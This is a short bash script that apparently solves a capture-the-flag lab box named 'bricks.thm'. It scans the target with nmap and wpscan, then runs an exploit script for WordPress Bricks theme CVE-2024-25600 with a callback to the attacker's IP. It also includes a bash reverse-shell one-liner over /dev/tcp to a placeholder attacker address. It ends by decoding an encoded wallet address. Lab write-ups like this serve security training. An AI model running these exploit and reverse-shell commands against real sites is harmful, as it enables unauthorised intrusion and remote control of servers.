#!/bin/bash

# Perform a full TCP scan with service detection
nmap -A 10.10.39.101

# Enumerate WordPress plugins, themes, and vulnerabilities
wpscan --url https://bricks.thm --disable-tls-checks

# Exploit WordPress theme vulnerability CVE-2024-25600
python3 CVE-2024-25600.py --url https://bricks.thm --callback [YOUR_IP]:[YOUR_PORT]

# Upgrade to a stable shell
bash -c 'exec bash -i &>/dev/tcp/[YOUR_IP]/[YOUR_PORT] <&1'

# List running services
systemctl list-units --type=service --state=running

# Decode wallet address using CyberChef
# Note: Replace the encoded string with the actual encoded wallet address
ENCODED="5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d"
echo $ENCODED | xxd -r -p | base64 -d
